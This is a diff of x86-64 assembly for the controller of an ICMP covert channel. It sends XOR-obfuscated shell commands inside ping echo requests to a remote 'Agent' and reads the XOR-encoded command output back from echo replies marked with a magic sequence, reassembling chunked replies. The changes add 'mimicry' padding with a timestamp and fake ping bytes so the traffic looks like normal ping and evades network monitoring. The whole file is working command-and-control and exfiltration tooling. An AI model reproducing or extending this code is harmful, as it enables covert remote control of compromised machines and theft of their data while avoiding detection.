@@ -14,14 +14,22 @@ section .data
     newline db 10               ; ASCII newline (\n)
     forip db 4                  ; Legacy unused variable
     space_char db 32            ; ASCII space character
+    
+    ; --- [MIMICRY UPDATE] UPDATED PACKET ANATOMY ---
     icmp_packet:
         type db 8               ; ICMP Type 8 (Echo Request)
-        code db 0               ; ICMP Code 0
+        code db 0               
         checksum dw 0           ; Checksum placeholder
         identifier dw 0x1234    ; Packet Identifier
-        sequence db 0xDE, 0xAD  ; Sequence number filter (0xDEAD)
-        payload times 100 db 0  ; Command payload buffer
-    payload_len equ $ - payload ; Length of the command payload
+        sequence db 0xDE, 0xAD  ; Magic Sequence for filtering (0xDEAD)
+        ; --- MIMICRY PADDING (24 BYTES) ---
+        mimicry_ts dq 0         ; 8-byte Dynamic Timestamp (RDTSC)
+        mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
+                    db 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
+        ; -------------------------------------
+        payload times 100 db 0  ; Command payload buffer (100 bytes)
+    payload_len equ $ - payload ; Total Payload (Padding + Command = 124 bytes)
+    
     target_addr:
         dw 2                    ; AF_INET (IPv4)
         dw 0                    ; Port (Unused for ICMP)
@@ -31,126 +39,147 @@ section .data
 section .text
 global _start
 
-; --- RAW SOCKET SETUP ---
+; --- ENTRY POINT ---
 _start:
+    ; Create Raw ICMP Socket
     mov rax, 41             ; sys_socket
     mov rdi, 2              ; AF_INET (IPv4)
     mov rsi, 3              ; SOCK_RAW
     mov rdx, 1              ; IPPROTO_ICMP
-    syscall                 ; Returns sockfd in rax
+    syscall                 
     mov [fd_no], eax        ; Save sockfd
-;-----------------------------------------------------------------------------------------
 
-    ; --- 1. PROMPT USER FOR IP ---
+    ; Display Target IP Prompt
     mov rax, 1              ; sys_write
     mov rdi, 1              ; stdout
     mov rsi, msg_ip
     mov rdx, len_msg_ip
     syscall
 
-    ; --- 2. READ USER INPUT IP ---
+    ; Read Target IP from Stdin
     mov rax, 0              ; sys_read
     mov rdi, 0              ; stdin
     mov rsi, ip_buf
     mov rdx, 16
     syscall
 
-    ; --- 3. STRING TO IP CONVERSION ALGORITHM ---
-    lea rsi, [ip_buf]           ; Source: User input string
-    lea rdi, [target_addr + 4]  ; Destination: IP field in target_addr struct
-    xor ebx, ebx                ; Temporary byte accumulator (0-255)
-    xor rax, rax                ; Clear rax
+    ; Initialize String-to-IP Conversion
+    lea rsi, [ip_buf]           
+    lea rdi, [target_addr + 4]  
+    xor ebx, ebx                
+    xor rax, rax                
 
 _parse_ip_loop:
-    lodsb                       ; Load byte from rsi to al, increment rsi
+    lodsb                       ; Load next byte from IP buffer
     cmp al, 10                  ; Check for Newline (Enter)
-    je .store_byte              ; Store final segment and finish
+    je .store_byte              
     cmp al, 46                  ; Check for Dot (.)
-    je .store_byte              ; Store current segment and move to next
+    je .store_byte              
     
-    ; Logic: ebx = (ebx * 10) + (al - '0')
-    sub al, 48                  ; ASCII '0'-'9' to integer 0-9
-    imul ebx, 10                ; Shift digits to the left
-    add ebx, eax                ; Add new digit
+    ; ASCII to Integer: ebx = (ebx * 10) + (al - '0')
+    sub al, 48                  
+    imul ebx, 10                
+    add ebx, eax                
     jmp _parse_ip_loop
 
 .store_byte:
-    mov [rdi], bl               ; Store the parsed byte (e.g., 192) to target_addr
-    inc rdi                     ; Move target pointer forward 1 byte
-    xor ebx, ebx                ; Reset accumulator for next segment
-    cmp al, 10                  ; Was the trigger an Enter key?
-    je _get_command             ; If yes, conversion done. Move to command prompt.
-    jmp _parse_ip_loop          ; If no (was a dot), continue parsing next segment
+    mov [rdi], bl               ; Store parsed octet into target_addr struct
+    inc rdi                     
+    xor ebx, ebx                ; Reset octet accumulator
+    cmp al, 10                  ; Finish if Newline detected
+    je _get_command             
+    jmp _parse_ip_loop          
 
 _get_command:
-    ; --- PROMPT FOR COMMAND ---
+    ; --- CLEAR PAYLOAD BUFFER (Security & Integrity) ---
+    cld
+    lea rdi, [payload]
+    xor al, al
+    mov rcx, 100
+    rep stosb
+    
+    ; Display Command Prompt
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, msg_cmd
+    mov rdx, len_msg_cmd
+    syscall
+
+    ; Read Command from Stdin
     mov rax, 0              ; sys_read
     mov rdi, 0              ; stdin
-    mov rsi, payload        ; Buffer for command
+    mov rsi, payload        
     mov rdx, 100            
     syscall
     
     ; --- STRIP NEWLINE CHARACTER ---
-    dec rax                         ; rax = bytes read, move to last index
-    mov byte [payload + rax], 0     ; Null terminate to clean the command string
-    ; --------------------------------
+    dec rax                         
+    mov byte [payload + rax], 0     ; Null terminate for clean execution
+    
+    ; --- OBFUSCATION PHASE ---
+    lea rsi, [payload]      
+    mov rcx, 100            ; Obfuscate entire 100-byte buffer
+    call _xor_cipher        
 
-    call _checksum_cal      ; Calculate ICMP checksum
-    call _sendto            ; Dispatch command packet to target agent
+    ; --- [MIMICRY UPDATE] DYNAMIC TIMESTAMP INJECTION ---
+    rdtsc                           ; Read Time-Stamp Counter
+    mov [icmp_packet + 8], rax      ; Inject TS right after ICMP Header
+    ; -----------------------------------------------------
+
+    call _checksum_cal      ; Compute ICMP Checksum
+    call _sendto            ; Dispatch command to Agent
+
 _sniff:
-    ; --- SETUP RECVFROM PARAMETERS ---
+    ; --- RECVFROM CONFIGURATION ---
     mov dword [addr_len], 16   
     mov r8, incoming_addr       
     mov r9, addr_len            
     xor r10, r10                
 
-    ; --- CLEANUP RECEIVE BUFFER ---
+    ; --- CLEANUP RECV BUFFER ---
     lea rdi, [sniffed_data] 
     xor al, al              
     mov rcx, 1200           
-    rep stosb               ; Clear buffer to avoid mixing old data
-    ; ---------------------------
+    rep stosb               
 
-    ; --- LISTEN FOR RESPONSE (SNIFF) ---
+    ; --- LISTEN FOR AGENT RESPONSE ---
     mov rax, 45             ; sys_recvfrom 
     mov edi, [fd_no]        
     mov rsi, sniffed_data   
     mov rdx, 1200           
     syscall
 
-    ; --- ICMP TYPE FILTER ---
-    cmp byte [sniffed_data + 20], 0     ; Check if Type is 0 (Echo Reply)
-    jne _sniff                          ; Ignore if not a reply
-
-    ; --- MAGIC SEQUENCE FILTER ---
-    mov cx, word [sniffed_data + 26]    ; Sequence Number (Offset 26)
-    cmp cx, 0xEFBE                      ; Match magic 0xBEEF (Little Endian)
+    ; --- PROTOCOL FILTERS ---
+    cmp byte [sniffed_data + 20], 0     ; Match ICMP Type 0 (Echo Reply)
     jne _sniff                          
 
-    ; Error handling for recvfrom
+    ; --- MAGIC SEQUENCE VERIFICATION ---
+    mov cx, word [sniffed_data + 26]    ; Check Sequence Number (v2.1 logic)
+    cmp cx, 0xEFBE                      ; Match 0xBEEF (Little Endian)
+    jne _sniff                          
+
     cmp rax, 0               
     jl _error               
     je _exit                
 
-    ; Size check (IP 20 + ICMP 8)
-    cmp rax, 28              
+    ; --- [MIMICRY UPDATE] PACKET SIZE VALIDATION ---
+    ; Expected: IP(20) + ICMP(8) + Mimicry(24) = 52 Bytes Minimum
+    cmp rax, 52              
     jb _sniff               
 
-;-----------------------------------------------------------------------------------------------
-
-    ; --- EXTRACT PAYLOAD FROM ICMP PACKET ---
-    mov r14, rax                     ; Total read bytes
-    sub r14, 28                      ; Payload = Total - Headers (28)
-    lea rsi, [sniffed_data + 28]    ; rsi points to start of data
+    ; --- [MIMICRY UPDATE] PAYLOAD EXTRACTION ---
+    mov r14, rax                     
+    sub r14, 52                     ; Strip IP, ICMP, and Mimicry Padding
+    lea rsi, [sniffed_data + 52]    ; Start reading after Mimicry zone
     mov rdx, r14                     
     push rdx                        ; Save length for write syscall
     push rsi                        ; Save address for decryption
 
-    ; --- SENDER IP TO STRING CONVERSION (LOGGING) ---
+    ; --- SENDER IDENTIFICATION (IP LOGGING) ---
     xor rdx, rdx                     
     xor rbx, rbx                     
-    mov rcx, 7                       ; IP raw byte offset
-    mov rdi, 15                      ; String buffer offset
+    mov rcx, 7                       ; IP raw offset
+    mov rdi, 15                      ; IP string buffer offset
 _loopforip:
     mov bl, 10                       
     movzx ax, [incoming_addr + rcx]  
@@ -164,113 +193,114 @@ _divloop:
     jg _divloop                     
     cmp rcx, 4                       
     je _contiune                    
-    mov byte [addr_ip + rdi], 46     ; Dot (.)
+    mov byte [addr_ip + rdi], 46     ; Append Dot (.)
 _contiune:
     dec rdi                         
     dec rcx                         
     cmp rcx, 3                       
     jg _loopforip
 
-    ; --- PRINT LOGS TO TERMINAL ---
-    mov rax, 1              ; Print IP address
+    ; --- OUTPUT LOGGING ---
+    mov rax, 1              ; Print Source IP
     mov rdi, 1              
     mov rdx, 16              
     mov rsi, addr_ip         
     syscall
 
-    mov rax, 1              ; Print separator space
+    mov rax, 1              ; Print Space
     mov rdi, 1              
     mov rdx, 1               
     mov rsi, space_char      
     syscall
 
-    pop rsi                 ; Restore payload address
+    pop rsi                 ; Restore payload pointer
     pop rdx                 ; Restore payload length
 
-    ; --- XOR DECRYPTION PHASE ---
+    ; --- DE-OBFUSCATION PHASE ---
     mov rcx, rdx            ; rcx = payload size (r14)
-    call _xor_cipher        ; Decrypt in-place (rsi is preserved)
+    call _xor_cipher        ; Decrypt stream in-place
 
-    ; --- PRINT DECRYPTED OUTPUT ---
+    ; --- DISPLAY AGENT OUTPUT ---
     mov rax, 1              ; sys_write
     mov rdi, 1              
     syscall                 
 
-    ; --- CHUNKING LOGIC ---
-    cmp r14, 1024           ; Check if payload was full (1024 bytes)
-    je _sniff_chunk         ; If full, enter Vitesse 2: Chunking Receiver
-    jmp _end_stream         ; If smaller, stream is complete
+    ; --- [MIMICRY UPDATE] FRAGMENTATION (CHUNKING) LOGIC ---
+    cmp r14, 1000           ; Check if fragment is full (1000 bytes max)
+    je _sniff_chunk         ; If yes, enter Chunking Receiver mode
+    jmp _end_stream         ; If no, EOT (End of Transmission) reached
 
 ; ====================================================================
-; GEAR 2: PAYLOAD-ONLY LOOP (Chunking Receiver)
+; GEAR 2: FRAGMENTATION HANDLER (Chunking Receiver)
 ; ====================================================================
 _sniff_chunk:
-    ; --- BUFFER CLEANUP ---
     lea rdi, [sniffed_data]    
     xor al, al                 
     mov rcx, 1200              
     rep stosb                  
 
-    ; --- RECEIVE NEXT CHUNK ---
-    mov rax, 45                ; sys_recvfrom 
+    ; Listen for next fragment
+    mov rax, 45                
     mov edi, [fd_no]           
     mov rsi, sniffed_data      
     mov rdx, 1200              
     syscall
 
-    ; --- ERROR & FILTERS ---
     cmp rax, 0
     jl _error                  
     je _exit                   
-    cmp rax, 28                
+    
+    ; Validate fragment size
+    cmp rax, 52                
     jb _sniff_chunk            
 
     cmp byte [sniffed_data + 20], 0     ; Echo Reply filter
     jne _sniff_chunk                    
 
-    mov cx, word [sniffed_data + 26]    ; Magic Sequence filter
+    mov cx, word [sniffed_data + 26]    ; Sequence filter
     cmp cx, 0xEFBE                      
     jne _sniff_chunk                    
 
-    ; --- EXTRACT & DECRYPT CHUNK ---
+    ; --- EXTRACT & DECRYPT FRAGMENT ---
     mov r14, rax               
-    sub r14, 28                
-    lea rsi, [sniffed_data + 28] 
+    sub r14, 52                
+    lea rsi, [sniffed_data + 52] 
     
     mov rcx, r14                
     call _xor_cipher            
 
-    ; --- PRINT CHUNK ---
+    ; Print fragment
     mov rax, 1                 
     mov rdi, 1                 
     mov rdx, r14               
     syscall
 
-    ; --- LOOP CONTROL ---
-    cmp r14, 1024              ; Is more data expected?
-    je _sniff_chunk            ; YES: Continue receiving chunks
+    ; --- STREAM FLOW CONTROL ---
+    cmp r14, 1000              ; Check if more fragments are expected
+    je _sniff_chunk            
     
-    jmp _end_stream            ; NO: Close stream and return to prompt
+    jmp _end_stream            
 
 _end_stream:
-    ; --- UI FORMATTING ---
-    mov rax, 1              ; Print final newline
+    ; Close stream with formatting
+    mov rax, 1              
     mov rdi, 1              
     mov rsi, newline         
     mov rdx, 1               
     syscall
 
-    jmp _get_command        ; Reset to wait for next user command
+    jmp _get_command        ; Return to command loop
 
-
+; --- UTILITY: ICMP CHECKSUM CALCULATION ---
 _checksum_cal:
-    mov word [checksum], 0          ; Reset field before calculation
+    mov word [checksum], 0          
     xor rcx, rcx                    
     xor r13, r13                    
-    xor rax, rax                    ; Accumulator
+    xor rax, rax                    
     xor r12d, r12d                  
-    mov rcx, 8                      ; Base ICMP Header size
-    add rcx, payload_len            ; Total size for checksum
+    ; Compute total size: Header(8) + Payload_len(Mimicry + Command)
+    mov rcx, 8                      
+    add rcx, payload_len            
     mov r13, 0                      
     xor rbx, rbx                    
 .checksum_loop:
@@ -289,45 +319,47 @@ _checksum_cal:
 
 .wrap:
     mov ebx, eax                    
-    shr ebx, 16                     ; Extract carry bits
-    and eax, 0xFFFF                 ; Mask 16 bits
-    add ax, bx                      ; Add carry
-    adc ax, 0                       ; Add final carry
+    shr ebx, 16                     ; Process carry
+    and eax, 0xFFFF                 
+    add ax, bx                      
+    adc ax, 0                       
     not ax                          ; One's complement
     mov [checksum], ax              
     ret
 
+; --- UTILITY: TRANSMIT PACKET ---
 _sendto:
-    mov r13, 8               ; Header length
-    add r13, payload_len     ; Total length
+    mov r13, 8               
+    add r13, payload_len     ; Total packet size (8 Header + 124 Payload)
     mov rax, 44              ; sys_sendto
-    mov rdi, [fd_no]         ; Raw socket
+    mov rdi, [fd_no]         
     mov rsi, icmp_packet     
     mov rdx, r13             
     mov r10, 0               
-    mov r8, target_addr      ; Target struct (IPv4 + User defined IP)
+    mov r8, target_addr      
     mov r9, 16               
     syscall
     ret
 
+; --- UTILITY: XOR OBFUSCATION ---
 _xor_cipher:
-    test rcx, rcx               ; Check for zero length
+    test rcx, rcx               
     jz .done                    
-    push rsi                    ; Preserve pointer
+    push rsi                        
 .loop:
-    xor byte [rsi], 0x42        ; Key: 0x42 (In-place XOR)
+    xor byte [rsi], 0x42        ; Symmetric XOR key: 0x42
     inc rsi                     
     loop .loop                  
-    pop rsi                     ; Restore pointer
+    pop rsi                     
 .done:
     ret
 
 _error:
     mov rax, 60              ; sys_exit
-    mov rdi, 1               ; Status: Error
+    mov rdi, 1               
     syscall
 
 _exit:
     mov rax, 60              ; sys_exit
-    mov rdi, 0               ; Status: Success
+    mov rdi, 0               
     syscall
